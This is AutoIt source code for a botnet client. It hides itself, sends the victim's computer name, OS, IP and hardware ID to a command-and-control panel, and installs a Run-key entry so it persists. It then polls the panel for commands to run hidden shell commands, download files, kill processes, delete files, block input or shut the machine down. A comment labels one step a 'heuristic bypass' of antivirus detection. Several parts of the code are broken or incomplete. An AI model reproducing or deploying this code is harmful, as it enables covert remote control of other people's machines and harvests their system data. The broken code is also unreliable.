; Includes
#include <IE.au3>
#include <Inet.au3>
#include <MsgBoxConstants.au3>
#include <AutoItConstants.au3>
#include <APIDiagConstants.au3>
#include <Crypt.au3>
#include <StringConstants.au3>

; Hidden from taskbar and hidden icons
#Notrayicon

; Bot information
$hwid = _GetHardwareID($UHID_ALL)
$os = @OSVersion
$bit = @OSArch
$ip =  _GetIP()

; Global Variables
Global $panel = "http://<your url>/task.php" ; 	Path to the controller
Global $CD = DriveGetDrive("ALL")

; Heuristic bypass
$dif = TimerDiff($begin)
ConsoleWrite(_BytesToBits(1024) & @CRLF)
If $dif > 1000 Then ExitLoop
	
; Keep connection while Computer is online
While (1)
    $con = _INetGetSource($panel)
    sleep(1000)
    if $con then
	  ExCmd()
    endif
    startup() ; Startup
    Sleep(3000)
 WEnd

Func callhome()

	$data = "pcname=" & @ComputerName & @CRLF & "&os=" & $os & @CRLF & "&bit=" & $bit & @CRLF & "&ip=" & $ip & @CRLF & "&hwid=" & $hwid & @CRLF
	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST", "http://<your url>/newBot.php", False)
	$oHTTP.SetRequestHeader("User-Agent", "agent")
	$oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	$oHTTP.Send($data)
	$oReceived = $oHTTP.ResponseText
	ConsoleWrite($oReceived)

EndFunc   ;==>SendPhp

Func MyErrFunc()

	;catching errors.

Endfunc

Func ExCmd()

    If StringInStr($con, "RUN?", 2) Then ; Runs cmd command on local machine

		$cmd = StringSplit($con, "?")
	    Run($cmd[2], "", @SW_HIDE)
        Sleep(7000)

    ElseIf StringInStr($con, "DOWNLOAD?", 2) Then ; Downloads file to local machine from a direct download link

		$cmd = StringSplit($con, "?")
        InetGet($cmd[2], $cmd[3], 1, 0)
        Sleep(7000)

    ElseIf StringInStr($con, "KILL?", 2) Then ; Kills proccess by name on local machine without .exe extension

		$cmd = StringSplit($con, "?")
        Run("TASKKILL /F /IM " & $cmd[2] & ".exe", "", @SW_HIDE)
        Sleep(7000)

    ElseIf StringInStr($con, "DELETE?", 2) Then ; Deletes file from local machine

		$cmd = StringSplit($con, "?")
        FileDelete($cmd[2])
        Sleep(7000)

    ElseIf StringInStr($con, "VISIT?", 2) Then ; Visit URL on local machine (Hidden)

		$cmd = StringSplit($con, "?")
		 _IECreate($cmd[2], 0, 0, 1)
        Sleep(7000)

    ElseIf StringInStr($con, "BOX?", 2) Then ; Displays a messagebox with on local machine

		$cmd = StringSplit($con, "?")
        MsgBox(16,$cmd[2],$cmd[3])
        Sleep(7000)

    ElseIf StringInStr($con, "Uninstall", 2) Then ; Uninstalls the stub from the local machine

	    FileDelete(@ScriptFullPath, @AppDataDir & "\electro.exe", 1)
	    RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "electro")
		Sleep(10000)

    ElseIf StringInStr($con, "SHUTDOWN", 2) Then ; Shutdowns local machine via cmd

		Shutdown(6)
        Sleep(7000)

    ElseIf StringInStr($con, "RESTART", 2) Then ; Restarts local machine via cmd

		Shutdown(2)
        Sleep(7000)

    ElseIf StringInStr($con, "LOCK", 2) Then ; Locks local machine via cmd

		BlockInput(1)
        Sleep(7000)

    ElseIf StringInStr($con, "UNLOCK", 2) Then ; Unlocks local machine via cmd

		BlockInput(0)
        Sleep(7000)

    ElseIf StringInStr($con, "BEEP", 2) Then ; Makes beeping sound on local machine

		Beep(4000,650)
        Sleep(2000)

    ElseIf StringInStr($con, "CDOPEN", 2) Then ; Opens CD drive on local machine

	   For $i = 1 to $CD[0]
		 CDTray($CD[$i],"open")
	   next
	   Sleep(3000)

    ElseIf StringInStr($con, "CDCLOSE", 2) Then ; Closes CD drive on local machines

	   For $i = 1 to $CD[0]
		 CDTray($CD[$i],"close")
	   next
	   Sleep(3000)

    EndIf

 EndFunc

Func startup()

    RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "electro")

    If @error Then
	   RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "electro", "REG_SZ", @AppDataDir & "\electro.exe

	   ; Send new infection Information to the C&C Database
	   callhome()

	   FileCopy(@ScriptFullPath, @AppDataDir & "\electro.exe", 1)

	   $Open_Regedit = RegRead("HKEY_CLASSES_ROOT\regfile\shell\open\command", "(Default)")

    If $Open_Regedit <> 'regedit.exe' Then
	   RegWrite("HKEY_CLASSES_ROOT\regfile\shell\open\command", "(Default)", "REG_SZ", "regedit.exe")

EndFunc

; #FUNCTION# ====================================================================================================================
; Name ..........: _GetHardwareID
; Description ...: Generates a unique hardware identifier (ID) for the local computer.
; Syntax ........: _GetHardwareID([$iFlags = Default])
; Parameters ....: $iFlags   - [optional] The flags that specifies what information would be used to generate ID.
;                            This parameter can be one or more of the following values.
;
;                            $UHID_MB (0)
;                            Uses information about your motherboard. This flag is used by default regardless of whether specified or not.
;
;                            $UHID_BIOS (1)
;                            Uses information about the BIOS.
;
;                            $UHID_CPU (2)
;                            Uses information about the processor(s).
;
;                            $UHID_HDD (4)
;                            Uses information about the installed hard drives. Any change in the configuration disks will change ID
;                            returned by this function. Taken into account only non-removable disks.
;
;                            $UHID_All (7)
;                            The sum of all the previous flags. Default is $UHID_MB (0).
;
;                  $bIs64Bit - [optional] Search the 64-bit section of the registry. Default is dependant on AutoIt bit version.
;                            Note: 64-bit can't be searched when running the 32-bit version of AutoIt.
; Return values..: Success - The string representation of the ID. @extended returns the value that contains a combination of flags
;                            specified in the $iFlags parameter. If flag is set, appropriate information is received successfully,
;                            otherwise fails. The function checks only flags that were specified in the $iFlags parameter.
;                  Failure - Null and sets @error to non-zero.
; Author.........: guinness with the idea by Yashied (_WinAPI_UniqueHardwareID() - WinAPIDiag.au3)
; Modified ......: Additional suggestions by SmOke_N.
; Remarks .......: The constants above can be found in APIDiagConstant.au3. It also requires StringConstants.au3 and Crypt.au3 to be included.
; Example........: Yes
; ===============================================================================================================================
Func _GetHardwareID($iFlags = Default, $bIs64Bit = Default)
    Local $sBit = @AutoItX64 ? '64' : ''

    If IsBool($bIs64Bit) Then
        ; Use 64-bit if $bIs64Bit is true and AutoIt is a 64-bit process; otherwise 32-bit
        $sBit = $bIs64Bit And @AutoItX64 ? '64' : ''
    EndIf

    If $iFlags == Default Then
        $iFlags = $UHID_MB
    EndIf

    Local $aSystem = ['Identifier', 'VideoBiosDate', 'VideoBiosVersion'], _
            $iResult = 0, _
            $sHKLM = 'HKEY_LOCAL_MACHINE' & $sBit, $sOutput = '', $sText = ''

    For $i = 0 To UBound($aSystem) - 1
        $sOutput &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\', $aSystem[$i])
    Next
    $sOutput &= @CPUArch
    $sOutput = StringStripWS($sOutput, $STR_STRIPALL)

    If BitAND($iFlags, $UHID_BIOS) Then
        Local $aBIOS = ['BaseBoardManufacturer', 'BaseBoardProduct', 'BaseBoardVersion', 'BIOSVendor', 'BIOSReleaseDate']
        $sText = ''
        For $i = 0 To UBound($aBIOS) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\BIOS\', $aBIOS[$i])
        Next
        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_BIOS
            $sOutput &= $sText
        EndIf
    EndIf

    If BitAND($iFlags, $UHID_CPU) Then
        Local $aProcessor = ['ProcessorNameString', '~MHz', 'Identifier', 'VendorIdentifier']

        $sText = ''
        For $i = 0 To UBound($aProcessor) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\CentralProcessor\0\', $aProcessor[$i])
        Next

        For $i = 0 To UBound($aProcessor) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\CentralProcessor\1\', $aProcessor[$i])
        Next

        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_CPU
            $sOutput &= $sText
        EndIf
    EndIf

    If BitAND($iFlags, $UHID_HDD) Then
        Local $aDrives = DriveGetDrive('FIXED')

        $sText = ''
        For $i = 1 To UBound($aDrives) - 1
            $sText &= DriveGetSerial($aDrives[$i])
        Next

        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_HDD
            $sOutput &= $sText
        EndIf
    EndIf

    Local $sHash = StringTrimLeft(_Crypt_HashData($sOutput, $CALG_MD5), StringLen('0x'))
    If Not $sHash Then
        Return SetError(1, 0, Null)
    EndIf

    Return SetExtended($iResult, StringRegExpReplace($sHash, '([[:xdigit:]]{8})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{12})', '{\1-\2-\3-\4-\5}'))
 EndFunc   ;==>_GetHardwareID
